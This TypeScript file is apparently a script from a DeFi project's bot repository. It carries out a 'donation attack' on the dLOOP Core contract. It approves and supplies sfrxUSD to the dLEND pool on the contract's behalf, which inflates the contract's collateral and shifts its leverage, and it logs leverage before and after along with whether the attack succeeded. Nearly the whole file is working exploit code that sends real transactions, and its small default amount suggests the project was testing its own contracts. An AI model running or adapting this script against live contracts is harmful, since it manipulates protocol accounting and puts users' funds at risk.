import { ethers } from "ethers";
import { ContractManager } from "../src/bot/ContractManager";
import { getTokenDecimals, getTokenSymbol, formatTokenAmountWithSymbol } from "../src/common/erc20";
import { logger } from "../src/common/log";
import { getConfig } from "../src/config/config";
import { ONE_PERCENT_BPS } from "../src/config/constants";

interface DonationAttackParams {
  donationAmount: string; // Amount of sfrxUSD to donate in human readable format (e.g., "100" for 100 sfrxUSD)
  slippageBps?: bigint; // Slippage tolerance in basis points (optional, for future use)
}

/**
 * Execute a donation attack by supplying sfrxUSD collateral to dLEND on behalf of the dLOOP Core contract
 * This artificially inflates the collateral balance in dLEND, potentially affecting leverage calculations
 */
async function executeDonationAttack(params: DonationAttackParams): Promise<void> {
  const { donationAmount, slippageBps = BigInt(0.5 * ONE_PERCENT_BPS) } = params;

  try {
    const config = getConfig();

    // Initialize contract manager
    const contractManager = await ContractManager.create(config);

    // Get signer address
    const signerAddress = await contractManager.getSignerAddress();

    logger.info("Starting donation attack", {
      signer: signerAddress,
      donationAmount,
      slippageBps,
      dLoopCore: config.contracts.dloopCore,
    });

    // Get token addresses
    const collateralTokenAddress = await contractManager.getCollateralTokenAddress();
    const debtTokenAddress = await contractManager.getDebtTokenAddress();

    logger.info("Token addresses retrieved", {
      collateralToken: collateralTokenAddress,
      debtToken: debtTokenAddress,
    });

    // Get token metadata for display
    const provider = contractManager.provider;
    const [collateralMetadata, debtMetadata] = await Promise.all([
      getTokenMetadata(provider, collateralTokenAddress),
      getTokenMetadata(provider, debtTokenAddress),
    ]);

    logger.info("Token metadata retrieved", {
      collateral: `${collateralMetadata.symbol} (${collateralMetadata.decimals} decimals)`,
      debt: `${debtMetadata.symbol} (${debtMetadata.decimals} decimals)`,
    });

    // Parse donation amount
    const donationAmountBigInt = ethers.parseUnits(donationAmount, collateralMetadata.decimals);
    logger.info(`Parsed donation amount: ${formatTokenAmountWithSymbol(donationAmountBigInt, collateralMetadata.decimals, collateralMetadata.symbol)}`);

    // Check current leverage before attack
    logger.info("Checking leverage before donation attack...");
    const leverageBefore = await contractManager.core.getCurrentLeverageBps();
    const leveragePercentBefore = (Number(leverageBefore) / ONE_PERCENT_BPS).toFixed(5) + "%";

    logger.info("Leverage before attack", {
      leverageBps: leverageBefore.toString(),
      leveragePercent: leveragePercentBefore,
    });

    // Get dLEND pool contract
    const { pool: dLENDPool, poolAddress: dLENDPoolAddress } = await contractManager.getDLENDPool();

    logger.info("dLEND pool retrieved", {
      poolAddress: dLENDPoolAddress,
    });

    // Get collateral token contract
    const collateralToken = await contractManager.getCollateralToken();

    // Check user's sfrxUSD balance
    const userBalance = await collateralToken.balanceOf(signerAddress);
    logger.info(`User ${collateralMetadata.symbol} balance: ${formatTokenAmountWithSymbol(userBalance, collateralMetadata.decimals, collateralMetadata.symbol)}`);

    if (userBalance < donationAmountBigInt) {
      throw new Error(`Insufficient ${collateralMetadata.symbol} balance. Required: ${formatTokenAmountWithSymbol(donationAmountBigInt, collateralMetadata.decimals, collateralMetadata.symbol)}, Available: ${formatTokenAmountWithSymbol(userBalance, collateralMetadata.decimals, collateralMetadata.symbol)}`);
    }

    // Check allowance for dLEND pool
    const allowance = await collateralToken.allowance(signerAddress, dLENDPoolAddress);
    if (allowance < donationAmountBigInt) {
      logger.info(`Approving dLEND pool ${dLENDPoolAddress} to spend ${collateralMetadata.symbol}...`);
      const approveTx = await collateralToken.approve(dLENDPoolAddress, donationAmountBigInt);
      logger.info(`Approval transaction submitted`, {
        txHash: approveTx.hash,
      });
      await approveTx.wait();
      logger.info("Approval confirmed");
    } else {
      logger.info(`Already have sufficient allowance for dLEND pool to spend ${collateralMetadata.symbol}`);
    }

    // Get dLOOP Core contract address for onBehalfOf parameter
    const dLoopCoreAddress = config.contracts.dloopCore;

    // Execute donation attack - supply sfrxUSD to dLEND on behalf of dLOOP Core
    logger.info("Executing donation attack - supplying sfrxUSD to dLEND on behalf of dLOOP Core...");
    logger.info("Donation attack parameters", {
      asset: collateralTokenAddress,
      amount: donationAmountBigInt.toString(),
      onBehalfOf: dLoopCoreAddress,
      referralCode: 0,
    });

    const supplyTx = await dLENDPool.supply(
      collateralTokenAddress,
      donationAmountBigInt,
      dLoopCoreAddress, // Supply on behalf of dLOOP Core contract
      0 // referralCode
    );

    logger.info("Donation attack transaction submitted", {
      txHash: supplyTx.hash,
    });

    // Wait for transaction confirmation
    const receipt = await supplyTx.wait(3);
    logger.info("Donation attack transaction confirmed", {
      txHash: receipt!.hash,
      gasUsed: receipt!.gasUsed.toString(),
      blockNumber: receipt!.blockNumber,
    });

    // Check leverage after attack
    logger.info("Checking leverage after donation attack...");
    const leverageAfter = await contractManager.core.getCurrentLeverageBps();
    const leveragePercentAfter = (Number(leverageAfter) / ONE_PERCENT_BPS).toFixed(5) + "%";

    logger.info("Leverage after attack", {
      leverageBps: leverageAfter.toString(),
      leveragePercent: leveragePercentAfter,
    });

    // Calculate leverage change
    const leverageChange = Number(leverageAfter) - Number(leverageBefore);
    const leverageChangePercent = (leverageChange / 100).toFixed(2) + "%";

    logger.info("Leverage impact analysis", {
      leverageBefore: leveragePercentBefore,
      leverageAfter: leveragePercentAfter,
      leverageChangeBps: leverageChange.toString(),
      leverageChangePercent,
      attackSuccessful: leverageChange !== 0,
    });

    // Get updated dLEND user account data for dLOOP Core
    try {
      const [totalCollateralBase, totalDebtBase, availableBorrowsBase, currentLiquidationThreshold, ltv, healthFactor] =
        await dLENDPool.getUserAccountData(dLoopCoreAddress);

      logger.info("dLOOP Core dLEND position after attack", {
        totalCollateralBase: totalCollateralBase.toString(),
        totalDebtBase: totalDebtBase.toString(),
        availableBorrowsBase: availableBorrowsBase.toString(),
        currentLiquidationThreshold: currentLiquidationThreshold.toString(),
        ltv: ltv.toString(),
        healthFactor: healthFactor.toString(),
      });
    } catch (error) {
      logger.warn("Could not retrieve dLEND user account data", { error: error instanceof Error ? error.message : String(error) });
    }

    logger.info("✅ Donation attack completed successfully!", {
      donatedAmount: formatTokenAmountWithSymbol(donationAmountBigInt, collateralMetadata.decimals, collateralMetadata.symbol),
      leverageBefore: leveragePercentBefore,
      leverageAfter: leveragePercentAfter,
      leverageChangePercent,
    });

  } catch (error) {
    console.error(error);
    logger.error("Donation attack failed", {
      error: error instanceof Error ? error.message : String(error),
      stack: error instanceof Error ? error.stack : undefined,
    });
    throw error;
  }
}

/**
 * Helper function to get token metadata
 */
async function getTokenMetadata(
  provider: ethers.Provider,
  tokenAddress: string
): Promise<{ decimals: number; symbol: string }> {
  const [decimals, symbol] = await Promise.all([
    getTokenDecimals(provider, tokenAddress),
    getTokenSymbol(provider, tokenAddress),
  ]);
  return { decimals, symbol };
}

/**
 * Main execution function
 */
async function main(): Promise<void> {
  // Default parameters - can be modified as needed
  const attackParams: DonationAttackParams = {
    donationAmount: "0.01", // Small amount for testing - donate 0.01 sfrxUSD
    slippageBps: BigInt(0.5 * ONE_PERCENT_BPS), // 0.5% slippage (not used in current implementation)
  };

  logger.info("Starting dLOOP Core donation attack script", attackParams);

  try {
    await executeDonationAttack(attackParams);
    logger.info("✅ Donation attack script completed successfully!");
  } catch (error) {
    logger.error("❌ Donation attack script failed", {
      error: error instanceof Error ? error.message : String(error),
    });
    process.exit(1);
  }
}

// Execute if run directly
if (require.main === module) {
  main().catch((error) => {
    console.error("Unhandled error:", error);
    process.exit(1);
  });
}

export { executeDonationAttack, DonationAttackParams };
